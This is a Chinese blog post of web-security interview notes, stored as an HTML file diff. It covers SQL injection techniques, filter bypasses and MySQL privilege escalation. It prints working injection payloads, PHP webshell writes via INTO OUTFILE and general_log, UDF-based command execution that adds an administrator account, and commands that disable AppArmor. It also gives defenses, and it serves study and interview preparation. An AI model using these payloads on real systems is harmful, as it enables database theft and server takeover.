@@ -1,0 +1,1326 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="default">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="之前实习面试时准备的资料，现在论文和工作都差不多定了，想起来可以分享一下，其中很多资料源于网络，也包含了部分自己的理解，现在回馈于网络，希望对准备面试的小伙伴们或许能起到一点帮助 OWASP TOP 10 注入 失效的身份认证（密码转储、字典攻击、钓鱼或社会工程之后发现失效的身份认证） 敏感数据泄漏（攻击者不是直接攻击，而是在传输过程中或从客户端窃取密钥、中间人攻击或者从服务器端窃取明文数据） X">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全面试准备一">
+<meta property="og:url" content="http://m3lon.github.io/2020/03/16/Web安全面试准备一/index.html">
+<meta property="og:site_name" content="m3lon">
+<meta property="og:description" content="之前实习面试时准备的资料，现在论文和工作都差不多定了，想起来可以分享一下，其中很多资料源于网络，也包含了部分自己的理解，现在回馈于网络，希望对准备面试的小伙伴们或许能起到一点帮助 OWASP TOP 10 注入 失效的身份认证（密码转储、字典攻击、钓鱼或社会工程之后发现失效的身份认证） 敏感数据泄漏（攻击者不是直接攻击，而是在传输过程中或从客户端窃取密钥、中间人攻击或者从服务器端窃取明文数据） X">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190226215142.png">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-1cf2ea307bdeb74a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2020-03-16T12:22:37.557Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全面试准备一">
+<meta name="twitter:description" content="之前实习面试时准备的资料，现在论文和工作都差不多定了，想起来可以分享一下，其中很多资料源于网络，也包含了部分自己的理解，现在回馈于网络，希望对准备面试的小伙伴们或许能起到一点帮助 OWASP TOP 10 注入 失效的身份认证（密码转储、字典攻击、钓鱼或社会工程之后发现失效的身份认证） 敏感数据泄漏（攻击者不是直接攻击，而是在传输过程中或从客户端窃取密钥、中间人攻击或者从服务器端窃取明文数据） X">
+<meta name="twitter:image" content="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190226215142.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+
+
+
+
+  <title>Web安全面试准备一 | m3lon</title>
+  
+
+
+
+
+
+
+
+
+  <style>
+	blockquote {
+	  color: #888;
+	  background-color: #eae6f3;
+	  border-left: 1rem solid #5236a0;
+	  padding: 0 1.5rem;
+	  position: relative;
+	  font-family: 'Roboto', sans-serif;
+	}
+
+	blockquote:before,
+	blockquote:after {
+	  color: #392570;
+	  font-size: 2.5rem;
+	  position: absolute;
+	  line-height: 2.5rem;
+	}
+
+	blockquote:before {
+	  content: "\201C";
+	  left: -1rem;
+	  top: 0;
+	}
+
+	blockquote:after {
+	  content: "\201D";
+	  right: 0;
+	  bottom: -1rem;
+	}
+</style>
+</head>
+
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/m3lon" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">m3lon</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2020/03/16/Web安全面试准备一/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="m3lon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/UMR.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m3lon">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web安全面试准备一</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-16T20:20:56+08:00">
+                2020-03-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>之前实习面试时准备的资料，现在论文和工作都差不多定了，想起来可以分享一下，其中很多资料源于网络，也包含了部分自己的理解，现在回馈于网络，希望对准备面试的小伙伴们或许能起到一点帮助</p>
+<h3 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h3><ol>
+<li>注入</li>
+<li>失效的身份认证（密码转储、字典攻击、钓鱼或社会工程之后发现失效的身份认证）</li>
+<li>敏感数据泄漏（攻击者不是直接攻击，而是在传输过程中或从客户端窃取密钥、中间人攻击或者从服务器端窃取明文数据）</li>
+<li>XML外部实体（XXE）</li>
+<li>失效的访问控制（比如越权 CORS配置错误导致允许未授权的API访问）</li>
+<li>安全配置错误</li>
+<li>跨站脚本（XSS）</li>
+<li>不安全的反序列化</li>
+<li>使用含有已知漏洞的组件</li>
+<li>不足的日志记录和监控</li>
+</ol>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>本质：用户输入的数据当作代码执行（类似于xss绕过就是更多的识别为控制字符，而相对应的编解码就是将控制字符识别为文本字符）</p>
+<p>注入的两个攻击条件：</p>
+<ul>
+<li><p>用户能够控制输入</p>
+</li>
+<li><p>原本程序要执行的代码，拼接了用户输入的数据</p>
+</li>
+</ul>
+<p>常见类型：数字型、字符型 | 报错回显、盲注（布尔盲注、时间盲注）</p>
+<p>mysql5.0以下没有information_schema,只能手工枚举爆破（二分法思想）</p>
+<p>SQL注入一般步骤：寻找注入点—后台数据库（Mysql、SQL Server、PostgreSQL）、类型判断— 字段数目判断</p>
+<h4 id="攻击技巧"><a href="#攻击技巧" class="headerlink" title="攻击技巧"></a>攻击技巧</h4><ol>
+<li><p>常见的攻击技巧</p>
+<ul>
+<li>盲注、宽字节、二次注入等，之后分点叙述</li>
+</ul>
+</li>
+<li><p>读写文件的技巧</p>
+<ul>
+<li><p><code>show  variables like &quot;%secure%&quot;; 关注secure_file_priv</code></p>
+<blockquote>
+<p>当参数 <code>secure_file_priv</code> <strong>为空</strong>时，对导入导出无限制</p>
+<p>当值为一个指定的目录时，只能向指定的目录导入导出</p>
+<p>当值被设置为NULL时，禁止导入导出功能</p>
+</blockquote>
+</li>
+<li><p>load_file</p>
+</li>
+<li><p>into dumpfile、into outfile: select hex(load_file(‘/etc/passwd’)) into dum-file ‘/tmp/potatos’;</p>
+</li>
+<li><p>Load data infield ‘/tmp/potatos’ into table potatoes;</p>
+</li>
+</ul>
+</li>
+<li><p>命令执行</p>
+<ul>
+<li><p>读写文件导入webshell</p>
+</li>
+<li><p>利用用户自定义函数UDF</p>
+</li>
+<li>利用phpmyadmin写入日志文件导入webshell</li>
+</ul>
+</li>
+<li><p>利用xp_cmdshell攻击存储过程</p>
+</li>
+<li><p>编码问题：宽字节注入GBK编码bf</p>
+</li>
+<li><p>SQL column Truncation 字段截断</p>
+</li>
+</ol>
+<h4 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h4><ul>
+<li>length</li>
+<li>mid(str,pos,len)截取字符串</li>
+<li>substr(str,pos,len)截取字符串 同substring</li>
+<li>ascii(str)返回字符串最左面字符的ascii值 </li>
+<li>ord(str)将字符或布尔类型转换为ascii码</li>
+<li>if(a,b,c)判断a，a为true，返回b，否则返回c</li>
+<li>benchmark(count,expr) 用于测试函数性能，可以让同一个函数执行若干次，使得返回的时间比平时长</li>
+<li>不同数据库中，都有着类似于benchmark的函数如：postgresql：pg_sleep() mssql:wait delay ‘0:0:5’</li>
+</ul>
+<p>基于布尔的盲注：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select database()),1,1))&gt;64 /*判断数据库名的第一个字符的ascii值是否大于64*/</span><br></pre></td></tr></table></figure>
+<p>报错注入payload：<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p>
+<ol>
+<li><p>XPath语法错误 mysql&gt;5.1.5</p>
+<ul>
+<li><p><code>id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p>
+<p>extractvalue(xml_document, XPath_String)报错原理：第二个参数要求Xpath格式，而我们的输入不是，故报错</p>
+</li>
+<li><p><code>id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></p>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+</li>
+</ul>
+</li>
+<li><p>BIGINT等数据类型溢出 mysql&lt;5.5.53生效</p>
+<ul>
+<li>Exp(~710)</li>
+</ul>
+</li>
+<li><p>concat+rand()+group_by()导致主键重复</p>
+<p>count()和group by在遇到rand()产生的重复值时报错</p>
+</li>
+</ol>
+<p>基于时间的盲注：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select if(SUBSTRING(user(),1,4)=&apos;root&apos;,sleep(4),1),null,null /*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/</span><br></pre></td></tr></table></figure>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><ul>
+<li>字符型注入（参数被单引号包围）、引号被转义（如通过后台过滤函数addslashes或者当magic_quotes_gpc开启时）</li>
+<li>编码为GBK</li>
+</ul>
+<p>0xbf27和0xbf5c均会解析为一个双字节字符（5c为\ 27 ‘ ）</p>
+<p>解决方法：数据库、操作系统、Web应用统一设置为UTF-8</p>
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><ul>
+<li><p>注入点必须为数字，但可以通过hex编码绕过（php7安全函数中 会将输入转换为字符串 编码绕过已经不行了）</p>
+</li>
+<li><p>单引号输入判断为字符型注入or数字型注入 通过1’ or 1=1#等进行逻辑判断</p>
+</li>
+<li><p>若为二次注入，需要判断注入点</p>
+</li>
+<li><p>注入点与注入类型确定后，通过order by判读字段数</p>
+</li>
+<li><p>拖库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=2 union select database()#</span><br><span class="line">1&apos; and 1=2 union select group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">1&apos; and 1=2 union select group_concat(column_name) from information_schema.columns where table_name=&apos;py_flag&apos;</span><br><span class="line">1&apos; and 1=2 union select tsctf_fla9 from py_flag#  TSCTF&#123;Simple_Sql_f0r_Y0u&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>各种重要符号如 空格、逗号、引号、等号、大小与号；各种关键字、函数</p>
+<ol>
+<li>substr逗号绕过</li>
+<li>limit逗号绕过 如limit 1,2 </li>
+<li>引号绕过（2种）</li>
+<li>空格绕过（至少说出三种）</li>
+<li>等号绕过（至少说出三种  ‘像’ ）</li>
+<li>大小与号绕过 （范围表示 表示比较说出4种）</li>
+<li>过滤函数绕过</li>
+</ol>
+<ul>
+<li><p>相关函数：</p>
+<ol>
+<li>group_concat(str1, str2…)将多个字符串连接，如果其中有一个为NULL，返回为NULL</li>
+<li>@@为系统变量，@为局部变量</li>
+</ol>
+</li>
+<li><p><strong>逗号绕过</strong>：</p>
+<ul>
+<li><p>字段间逗号：</p>
+<p>union select * from ((select 1)A join (select 2)B join (select 3)C）; 字段间的逗号，利用join绕过 @@datadir为查看创建数据库的目录</p>
+</li>
+<li><p><strong>substr提取子串逗号</strong>：</p>
+<ol>
+<li>from pos for Len: select substr(‘aaa’ from 1 for 3); 利用from pos for len替换提取子串中的逗号</li>
+<li>like子句：<code>select ascii(substr(user(),1,1))=114; --&gt; select user() like &quot;ro%&quot;;</code></li>
+</ol>
+</li>
+<li><p><strong>limit中逗号</strong>：</p>
+<ol>
+<li>offset关键字，limit 1,2 (初始偏移量为0)—&gt; limit 1 offset 2</li>
+</ol>
+</li>
+</ul>
+</li>
+<li><p><strong>引号绕过</strong></p>
+<ol>
+<li>select column_name from information_schema.tables where table_name=0x6D336C6F6E</li>
+<li>宽字节：<code>GBK %bf%27</code></li>
+</ol>
+</li>
+<li><p><strong>空格绕过</strong>：</p>
+<ol>
+<li>/**/ <code>--</code> #</li>
+<li>回车<code>%0a</code></li>
+<li>Tap键</li>
+<li>反引号 select`*`from`user`;</li>
+<li>两个空格</li>
+</ol>
+</li>
+<li><p><strong>等号绕过</strong>：</p>
+<ol>
+<li>like绕过 或者rlike</li>
+<li>regexp正则表达式匹配绕过</li>
+<li>大小与号绕过，不大于不小于不就是等于吗</li>
+<li>&lt;&gt;等价于!= 所以!(id&lt;&gt;1)</li>
+</ol>
+</li>
+<li><p><strong>大小与号绕过</strong></p>
+<ol>
+<li><p>between a and b</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and substr(username,1,1) between &apos;a&apos; and &apos;d&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Greatest least 返回最大值、最小值，参数只有一个的话就是返回那个字符的ascii</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select greatest(ascii(substr(&apos;m3lon&apos; from 1 for 1)),1);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>strcmp 相同为0，相反为-1</p>
+</li>
+<li><p>in关键字 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and substr(username,1,1) in (&apos;t&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li><p><strong>过滤函数绕过</strong>：</p>
+<ol>
+<li>sleep —&gt; benchmark(次数,表达式)</li>
+<li>Ascii—&gt;hex()、bin() 替代之后再用对应的进制转string</li>
+<li>Group_concat—&gt;concat_ws</li>
+<li>取子串的函数：substr、substring、mid、left、right</li>
+</ol>
+</li>
+<li><p>其他过滤：大小写绕过、特殊编码绕过（十六进制、ascii）、双写关键字、内联注释绕过</p>
+</li>
+</ul>
+<h4 id="SQL提权"><a href="#SQL提权" class="headerlink" title="SQL提权"></a>SQL提权</h4><ol>
+<li><p>利用phpmyadmin getshell <a href="https://xz.aliyun.com/t/3283#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3283#toc-0</a></p>
+<ul>
+<li><p>常用方法：select into outfile写入shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Select @@basedir; #爆出绝对路径</span><br><span class="line">show variables like &quot;%general%&quot;; # 利用general log位置猜测路径</span><br><span class="line">select &apos;&lt;?php eval($_POST[cmd]); ?&gt;&apos; into outfile &apos;C:/wamp64/www/ma.php&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过日志写shell（secure priv开启，无法直接into outfile）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%general%&quot;; </span><br><span class="line">set global general_log=&quot;ON&quot;;</span><br><span class="line">set global general_log_file=&quot;C:\\phpStudy\\www\\log.php&quot;; # 一定</span><br><span class="line">SELECT  &quot;&lt;?php @eval($_POST[&apos;cmd&apos;]);?&gt;&quot;;</span><br><span class="line">set global general_log = &quot;OFF&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>udf提权</p>
+<p>参考：<a href="https://www.cnblogs.com/litlife/p/9030673.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/9030673.html</a></p>
+<p>Windows: user-&gt;system  linux: user-&gt;root</p>
+<p>把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上指定目录如plugin下，从udf.dll中创建相应的函数如sys_eval，在调用这个函数时，mysql账户就转变为system权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜集相关信息，如查看mysql的位数 查看version-compile-os</span></span><br><span class="line">select version();</span><br><span class="line">select user();</span><br><span class="line">select @@basedir ;</span><br><span class="line">show variables like <span class="string">"%version%"</span>;</span><br><span class="line"></span><br><span class="line">use mysql;</span><br><span class="line">create table Tmp_udf(udf BLOB); <span class="comment">#blob和text都是mysql为了存储大量字符串的数据而设计的类型</span></span><br><span class="line">insert into Tmp_udf values(<span class="string">"hexcode"</span>);</span><br><span class="line">select udf from Tmp_udf into dumpfile <span class="string">'C:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll'</span>;</span><br><span class="line">drop table Tmp_udf;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者直接写入hexcode</span></span><br><span class="line">select unhex(<span class="string">"hexcode"</span>) into dumpfile <span class="string">"C:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建函数</span></span><br><span class="line">create <span class="keyword">function</span> sys_eval returns string soname <span class="string">"udf.dll"</span>;</span><br><span class="line">select * from mysql.func;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">select sys_eval(<span class="string">"whoami"</span>);</span><br><span class="line">select sys_eval(<span class="string">"net user ergou 123 /add"</span>); <span class="comment"># 心塞 并未创建成功 应该使用cmdshell函数 不过sqlmap的lib_mysqludf_sys.dll库中并没有添加该函数，所以网上那些大佬导入的是哪个库</span></span><br><span class="line">select sys_eval(<span class="string">"net localgroup Administrators ergou /add"</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>提示点：</p>
+<ol>
+<li><p>关于udf库的获取：</p>
+<ul>
+<li><p>路径: sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so_</p>
+</li>
+<li><p>github可分析源码：<a href="https://github.com/mysqludf/lib_mysqludf_sys" target="_blank" rel="noopener">https://github.com/mysqludf/lib_mysqludf_sys</a></p>
+</li>
+<li><p>解码：sqlmap下一些自带的二进制文件和shell，为了防止被误杀都经过了异或编码，不能直接使用，使用sqlmap自带的解码函数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo python  ./sqlmap/extra/cloak/cloak.py -d -i sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so_</span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看mysql的位数：</p>
+<p>主要要看到是version-complie-os是win32 还是 win64 </p>
+<p>verison-complie-machine: AMD64  CPU位数，我的理解是跟随主机位数的，cmd查看dxdiag可以查看系统系统，不一定主机为64位，mysql就是64位的</p>
+</li>
+</ul>
+</li>
+<li><p>udf上传目录：</p>
+<ul>
+<li><p>MySQL&lt;5.0，导出路径随意；</p>
+</li>
+<li><p>5.0 &lt;= MySQL&lt;5.1，则需要导出至目标服务器的系统目录（如：c:/windows/system32/）</p>
+</li>
+<li><p>MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</p>
+</li>
+</ul>
+</li>
+<li><p>plugin文件夹创建</p>
+<p>一般Lib、Plugin文件夹需要手工建立（可用<strong>NTFS ADS</strong>流模式突破进而创建文件夹）关于NTFS ADS <a href="https://c1h3ng.github.io/web/2018/06/19/windows-tricks/" target="_blank" rel="noopener">点这里</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;  //查找到mysql的目录</span><br><span class="line"> </span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION&apos;;</span><br><span class="line"> </span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br></pre></td></tr></table></figure>
+<p>嘤嘤嘤…  win10测试失败！</p>
+</li>
+<li><p>ubuntu导入lib_mysqludf_sys.so成功却系统函数执行不成功的问题：<a href="https://github.com/mysqludf/lib_mysqludf_sys/issues/4" target="_blank" rel="noopener">https://github.com/mysqludf/lib_mysqludf_sys/issues/4</a>: apparmor 某防护机制的保护作用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo aa-stutas</span><br><span class="line">sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/<span class="built_in">disable</span>/</span><br><span class="line">sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li><p>mof提权(提权条件苛刻)</p>
+<ol>
+<li>windows 03及以下版本</li>
+<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
+<li>secure-file-priv参数不为null</li>
+</ol>
+</li>
+<li><p>其他数据库提权</p>
+<p>​    </p>
+</li>
+<li><p>参考：</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/1#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/1#toc-15</a></li>
+<li><a href="https://www.cnblogs.com/litlife/p/9030673.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/9030673.html</a></li>
+<li><a href="https://c1h3ng.github.io/web/2018/06/19/windows-tricks/" target="_blank" rel="noopener">https://c1h3ng.github.io/web/2018/06/19/windows-tricks/</a></li>
+<li><a href="https://xz.aliyun.com/t/3283#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/3283#toc-5</a></li>
+</ul>
+</li>
+</ol>
+<h4 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h4><p>数据代码分离原则。（即参数是参数，语句是语句）</p>
+<ol>
+<li>最佳方法：预编译语句，绑定变量。使用预编译的SQL语句（prepare），SQL的语意不会变化，攻击者无法改变SQL的结构，即使攻击者插入了类似于’or ‘1’=’1的字符串，也只会将此字符串作为username查询（execute）。</li>
+<li>从数据类型角度来防御：限制数据类型，并统一数据格式。</li>
+<li>从开发者角度来防御：开发时尽量用安全函数代替不安全函数，编写安全代码。危险函数，常见的执行命令函数，动态访问函数，如C语言中的system(),PHP的eval()，JSP的include()导致的代码越权执行，都是注入。</li>
+<li>从数据库管理者角度来防御：最小权限原则，避免root,dbowner等高权限用户直接连接数据库。</li>
+</ol>
+<p>需要注意的是，在MySQL 5.7及更高版本中，密码列并不存在，它被更改为“authentication_string”。</p>
+<p>select * from mysql.user where user=substring_index(user(),‘@’,1)\G;</p>
